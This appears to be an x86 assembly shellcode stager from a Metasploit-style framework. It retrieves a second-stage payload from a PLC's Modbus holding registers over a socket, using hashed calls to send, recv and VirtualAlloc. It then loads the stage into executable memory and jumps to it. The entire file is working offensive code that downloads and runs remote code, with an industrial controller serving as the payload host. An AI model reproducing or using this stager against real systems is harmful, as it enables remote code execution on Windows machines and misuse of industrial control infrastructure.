;-----------------------------------------------------------------------------;
; Author: Borja Merino (bmerinofe[at]gmail[dot]com)        [Modbus support]
; Tested in Windows 7 32 bits
; Version: 0.1 (26 Noviembre 2016)
;-----------------------------------------------------------------------------;
[BITS 32]

; This block communicates with the PLC via modbus to retrieve the payload.
; The code gets the first 4 bytes to know the stage size and to reserve the
; necessary memory via VirtualAlloc. Then, it get the payload by making 
; successive "read holding" requests (function code 03). 
; Finally, the payload is run.

; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
; Output: None.
; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)

recv:
  ; Receive the size of the incoming second stage.
  push eax       	 ; flags (send). EAX is 0 due to the connect return
  push 0x0C	 	 ; size modbus payload
  jmp get_modbus_payload;
after_payload:
  push edi		 ; socket descriptor
  push 0x5F38EBC2        ; hash( "ws32_32.dll", "send" )
  call ebp               ; send( s, *buf, 0x0C, 0)

  push byte 0            ; flags
  push byte 0x0D         ; modbus reply size
  push esi               ; the modbus reply will be store after the arguments on the stack
  push edi               ; socket descriptor
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, *buf, 0x0D, 0 )

  ; Reserve a RWX buffer via VirtualAlloc to store the full payload
  mov ebx, DWORD [esi+9] ; payload size
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push ebx 	         ; push the newly recieved second stage length
  push byte 0            ; NULL
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE )

  sar ebx,1 		 ; payload size divided by 2 (each holding register = 16 bits)
  and DWORD [esi+9], 1	 ; check if the size is even
  jz num_even
  inc ebx		 ; if odd, increase by one the number of holding records to read
num_even:
  xchg eax, ebx
  sub dx,dx		 
  mov cx, 0x7D		 ; 125 words = 250 bytes are the max number of bytes that can be read per request
  div cx		 ; words % 7d = dx
			 ; ESI here points to the payload modbus. 
		 	 ; watch out! I don't check if eax=0. I assume the stage is always bigger than 250 bytes
 
  ; EAX = number of modbus needed to get the payload
  ; EDX = module (between 0 and 7D)
  ; EBX = buffer returns by VirtualAlloc
  ; Useful info here: http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf

  mov cx,0x0		; replace with addr base (MSF ADDR option). Default: 0x0 addr
  inc ecx               ; inc 2 words (32 bits) due to the payload size
  inc ecx
  xchg ch,cl 		; 0xNN = addr in little endian, 7d = 125 words (0x00NN007d)
  push edx		; save the module (between 0 and 7D). This will be get it after the requests
  push ebx              ; save the buffer addr. This will be get it after the requests

bucle:
  sub esp, 4
  mov word [esp], cx	   ; save the address from which to retrieve the payload
  mov word [esp+2],0x7d00  ; payload  (little enddian) 00 02 00 7d : add the number of words to read 7d = 125 words
  push 0x03010600    	   ; payload  (little enddian) 00 06 01 03 : modbus header
  push 0x00000100          ; payload  (little enddian) 00 01 00 00 : modbus header
  mov ecx, esp
  push eax          	 ; save the number of requests
  push 0x00	         ; flags
  push 0x0C              ; size modbus payload
  push ecx               ; modbus request to send
  push edi               ; socket descriptor
  push 0x5F38EBC2        ; hash( "ws32_32.dll", "send" )
  call ebp               ; send( s, *buf, 0x0C, 0)

  ; discard the first 9 bytes (modbus header)
  push 0x00              ; flags
  push 0x09              ; 9 bytes (header)
  lea esi, [esi+0x11]    ; pointer on the stack (after the args) to store the modbus reply
  push esi		 ; save data after the payload in the stack
  push edi               ; socket descriptor
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, *buf, 9, 0)

  push 0x00              ; flags
  push 0xfa              ; length payload: 250 bytes = 250 = 0xFA
  push ebx               ; pointer to the buffer
  push edi               ; socket descriptor
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, *buf, 0xFA, 0 )

  pop eax		 ; recover the number of requests needed
  add ebx,0xFA           ; increase in 250 bytes (0xFA) the offset to store the payload
  pop ecx	         ; junk data
  pop ecx                ; junk data
  pop ecx                ; ecx =  word count
  xchg ch,cl             ; some math to add 0xfa words and push back to the stack on little endian
  add cx, 0x7D
  xchg ch,cl
  dec eax		 ; decrease number of requests
  jnz bucle

  pop esi		 ; get the stage location
  pop edx		 ; get the module (between 0 and 7D)
  or edx, edx            ; check if edx=0. It means that the all stage is already saved
  jz run_stage
  xchg dh,dl
  sub esp, 4
  mov word [esp], cx     ; addr from which to add the last the resto of the payload
  mov word [esp+2],dx    ; payload  (little enddian) XX XX NN NN
  push 0x03010600        ; payload  (little enddian) 00 06 01 03
  push 0x00000100        ; payload  (little enddian) 00 01 00 00
  mov ecx, esp
  push eax               ; flags. EAX = 0 here
  push 0x0C              ; size modbus payload
  push ecx               ; pointer to the modbus request
  push edi		 ; socket descriptor
  push 0x5F38EBC2        ; hash( "ws32_32.dll", "send" )
  call ebp               ; send( s, *buf, 0x0C, 0 )

  push 0x00              ; flags
  push 0x09              ; length payload:9 bytes (header)
  lea eax, [esp+0x10]
  push eax		 ; pointer to the stack (after the args) to store the modbus reply
  push edi               ; socket descriptor
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, *buf, 9, 0 )

  push 0x00              ; flags
  push 0xfa              ; length payload: 250 bytes = 250 = 0xFA
  push ebx		 ; pointer to the buffer 
  push edi               ; socket descriptor
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, *buf, 0xfa, 0 )

run_stage:
  jmp esi

get_modbus_payload:
  call after_payload
message:
  ; the ninth and the tenth byte indicates de addr base (MSF ADDR option). Default 0x0 addr
  db 0x00,0x01,0x00,0x00,0x00,0x06,0x01,0x03,0x00,0x00,0x00,0x02 
